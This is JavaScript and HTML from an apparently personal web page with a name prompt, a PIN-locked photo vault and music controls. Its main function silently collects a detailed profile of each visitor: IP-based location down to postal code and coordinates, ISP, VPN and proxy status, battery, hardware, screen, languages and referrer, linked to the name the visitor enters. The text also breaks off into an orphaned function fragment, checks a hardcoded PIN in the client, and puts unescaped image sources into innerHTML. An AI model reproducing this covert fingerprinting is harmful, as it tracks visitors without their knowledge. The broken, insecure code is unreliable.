// Function to get IP and location details
async function getIPDetails() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip || 'Unknown',
      city: data.city || 'Unknown',
      region: data.region || 'Unknown',
      country: data.country_name || 'Unknown',
      postal: data.postal || 'Unknown',
      latitude: data.latitude || 'Unknown',
      longitude: data.longitude || 'Unknown',
      timezone: data.timezone || 'Unknown',
      isp: data.org || 'Unknown',
      vpn: data.vpn ? 'Yes' : 'No',
      proxy: data.proxy ? 'Yes' : 'No',
      hosting: data.hosting ? 'Yes' : 'No'
    };
  } catch (error) {
    console.log('IP fetch failed:', error);
    return {
      ip: 'Unknown',
      city: 'Unknown',
      region: 'Unknown',
      country: 'Unknown',
      postal: 'Unknown',
      latitude: 'Unknown',
      longitude: 'Unknown',
      timezone: 'Unknown',
      isp: 'Unknown',
      vpn: 'Unknown',
      proxy: 'Unknown',
      hosting: 'Unknown'
    };
  }
}

// Get battery info
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        level: Math.round(battery.level * 100) + '%',
        charging: battery.charging ? 'Yes' : 'No',
        timeLeft: battery.charging ? 'Charging' : battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' min' : 'Unknown'
      };
    }
  } catch (e) {}
  return { level: 'Unknown', charging: 'Unknown', timeLeft: 'Unknown' };
}

// Get network info
function getNetworkInfo() {
  if ('connection' in navigator) {
    const conn = navigator.connection;
    return {
      type: conn.effectiveType || 'Unknown',
      downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
      rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown',
      saveData: conn.saveData ? 'Yes' : 'No'
    };
  }
  return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
}

// Get memory info
function getMemoryInfo() {
  if ('deviceMemory' in navigator) {
    return navigator.deviceMemory + ' GB';
  }
  return 'Unknown';
}

// Get cores info
function getCoresInfo() {
  if ('hardwareConcurrency' in navigator) {
    return navigator.hardwareConcurrency + ' cores';
  }
  return 'Unknown';
}

// Get detailed browser info
function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browser = 'Unknown';
  let version = 'Unknown';
  
  if (ua.indexOf('Chrome') > -1) {
    browser = 'Chrome';
    version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
  } else if (ua.indexOf('Firefox') > -1) {
    browser = 'Firefox';
    version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
  } else if (ua.indexOf('Safari') > -1) {
    browser = 'Safari';
    version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
  } else if (ua.indexOf('Edge') > -1) {
    browser = 'Edge';
    version = ua.match(/Edge\/(\d+\.\d+)/)?.[1] || 'Unknown';
  }
  
  return { browser, version };
}

// Get OS info
function getOSInfo() {
  const ua = navigator.userAgent;
  let os = 'Unknown';
  
  if (ua.match(/Android/i)) os = 'Android';
  else if (ua.match(/iPhone|iPad|iPod/i)) os = 'iOS';
  else if (ua.match(/Windows/i)) os = 'Windows';
  else if (ua.match(/Mac/i)) os = 'MacOS';
  else if (ua.match(/Linux/i)) os = 'Linux';
  
  return os;
}

// Get screen info
function getScreenInfo() {
  return {
    width: screen.width + 'px',
    height: screen.height + 'px',
    colorDepth: screen.colorDepth + '-bit',
    orientation: screen.orientation ? screen.orientation.type : 'Unknown',
    availWidth: screen.availWidth + 'px',
    availHeight: screen.availHeight + 'px',
    pixelRatio: window.devicePixelRatio || '1'
  };
}

// Get language info
function getLanguageInfo() {
  return {
    language: navigator.language || 'Unknown',
    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
  };
}

// Get time info
function getTimeInfo() {
  const d = new Date();
  const offset = -d.getTimezoneOffset();
  const sign = offset >= 0 ? '+' : '-';
  const hours = Math.floor(Math.abs(offset) / 60);
  const minutes = Math.abs(offset) % 60;
  
  return {
    timestamp: d.toISOString(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
    offset: `GMT${sign}${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}`,
    locale: navigator.language || 'Unknown'
  };
}

// Get touch support
function getTouchSupport() {
  return {
    touchPoints: navigator.maxTouchPoints || 0,
    touchEvents: 'ontouchstart' in window ? 'Yes' : 'No'
  };
}

// Get do not track
function getDNT() {
  return navigator.doNotTrack || 'Not set';
}

// Get referrer
function getReferrer() {
  return document.referrer || 'Direct visit';
}

// Get page load time
function getPageLoadTime() {
  if (performance && performance.timing) {
    const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
    return loadTime + ' ms';
  }
  return 'Unknown';
}

// Main function to collect all visitor data
async function getVisitorData(name) {
  const ipDetails = await getIPDetails();
  const battery = await getBatteryInfo();
  const network = getNetworkInfo();
  const browser = getBrowserInfo();
  const os = getOSInfo();
  const screen = getScreenInfo();
  const language = getLanguageInfo();
  const time = getTimeInfo();
  const touch = getTouchSupport();
  
  const d = new Date();
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const date = d.getDate();
  const month = months[d.getMonth()];
  const year = d.getFullYear();
  let hours = d.getHours();
  const minutes = d.getMinutes().toString().padStart(2, '0');
  const seconds = d.getSeconds().toString().padStart(2, '0');
  const ampm = hours >= 12 ? 'pm' : 'am';
  hours = hours % 12 || 12;
  
  const datetime = `${date} ${month} ${year} ${hours}:${minutes}:${seconds} ${ampm}`;
  
  return {
    name: name,
    datetime: datetime,
    ip: ipDetails.ip,
    location: `${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}`,
    postal: ipDetails.postal,
    coordinates: `${ipDetails.latitude}, ${ipDetails.longitude}`,
    timezone: ipDetails.timezone,
    isp: ipDetails.isp,
    security: `VPN: ${ipDetails.vpn}, Proxy: ${ipDetails.proxy}, Hosting: ${ipDetails.hosting}`,
    os: os,
    browser: `${browser.browser} ${browser.version}`,
    device: navigator.userAgent,
    screen: `${screen.width} x ${screen.height} (${screen.colorDepth}, ${screen.orientation})`,
    availableScreen: `${screen.availWidth} x ${screen.availHeight}`,
    pixelRatio: screen.pixelRatio,
    language: language.language,
    languages: language.languages,
    timeInfo: `${time.timezone} (${time.offset})`,
    timestamp: time.timestamp,
    network: `${network.type} (${network.downlink}, ${network.rtt})`,
    saveData: network.saveData,
    battery: `${battery.level} (Charging: ${battery.charging}, Time left: ${battery.timeLeft})`,
    memory: getMemoryInfo(),
    cores: getCoresInfo(),
    touch: `${touch.touchPoints} touch points, Touch events: ${touch.touchEvents}`,
    doNotTrack: getDNT(),
    referrer: getReferrer(),
    pageLoadTime: getPageLoadTime(),
    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
    online: navigator.onLine ? 'Yes' : 'No',
    platform: navigator.platform || 'Unknown'
  };
}

  // Reset button
  document.querySelector('#nameModal .primary-btn').innerHTML = 'CONTINUE';
  
  document.getElementById('nameModal').classList.remove('show');
  document.getElementById('passModal').classList.add('show');
}

function openNameModal() { 
  document.getElementById('nameModal').classList.add('show'); 
  document.getElementById('vName').value = '';
  document.getElementById('vPass').value = '';
}

function closeAll() { 
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show')); 
}

function backToName() {
  document.getElementById('passModal').classList.remove('show');
  document.getElementById('nameModal').classList.add('show');
  document.getElementById('vPass').value = '';
}

function checkPass() {
  if(document.getElementById('vPass').value === '2009') {
    closeAll();
    document.getElementById('vaultPanel').classList.add('open');
    renderVault();
  } else { 
    alert("Wrong PIN"); 
  }
}

function closeVault() { 
  document.getElementById('vaultPanel').classList.remove('open'); 
}

function openPhoto() { 
  const profileImg = document.querySelector('.avatar-img').src;
  document.getElementById('zoomedImg').src = profileImg;
  document.getElementById('photoZoomModal').style.display = 'flex'; 
}

function closePhoto() { 
  document.getElementById('photoZoomModal').style.display = 'none'; 
}

const music = document.getElementById('bgMusic');
function toggleMusic() {
  if(music.paused) {
    music.play().catch(e => console.log('Audio play failed:', e));
    document.getElementById('mEmoji').classList.add('rotate');
  } else {
    music.pause();
    document.getElementById('mEmoji').classList.remove('rotate');
  }
}

function renderVault() {
  const photos = JSON.parse(localStorage.getItem('k_photos') || '[]');
  const grid = document.getElementById('photoGrid');
  
  if(photos.length === 0) {
    grid.innerHTML = '<div style="grid-column:span 3; text-align:center; color:#666; padding:20px;">No photos yet</div>';
    return;
  }
  
  grid.innerHTML = photos.map((src, index) => 
    `<div class="photo-item" onclick="viewPhoto('${src}')">
      <img src="${src}" alt="Vault photo ${index + 1}">
    </div>`
  ).join('');
}

function viewPhoto(src) {
  document.getElementById('zoomedImg').src = src;
  document.getElementById('photoZoomModal').style.display = 'flex';
}

function handleFiles(files) {
  const photos = JSON.parse(localStorage.getItem('k_photos') || '[]');
  let pending = files.length;
  
  Array.from(files).forEach(file => {
    if(!file.type.startsWith('image/')) {
      pending--;
      if(pending === 0) renderVault();
      return;
    }
    
    const reader = new FileReader();
    reader.onload = (e) => {
      photos.push(e.target.result);
      pending--;
      if(pending === 0) {
        localStorage.setItem('k_photos', JSON.stringify(photos));
        renderVault();
      }
    };
    reader.onerror = () => {
      pending--;
      if(pending === 0) renderVault();
    };
    reader.readAsDataURL(file);
  });
}

if(!localStorage.getItem('k_photos')) {
  const canvas = document.createElement('canvas');
  canvas.width = 200;
  canvas.height = 200;
  const ctx = canvas.getContext('2d');
  
  const gradient = ctx.createLinearGradient(0, 0, 200, 200);
  gradient.addColorStop(0, '#3b82f6');
  gradient.addColorStop(1, '#1e40af');
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, 200, 200);
  
  ctx.fillStyle = 'white';
  ctx.font = 'bold 60px "Font Awesome 6 Free"';
  ctx.textAlign = 'center';
  ctx.textBaseline = 'middle';
  ctx.fillText('üì∏', 100, 100);
  
  const sampleImage = canvas.toDataURL();
  localStorage.setItem('k_photos', JSON.stringify([sampleImage]));
}

renderVault();
</script>
</body>
</html>
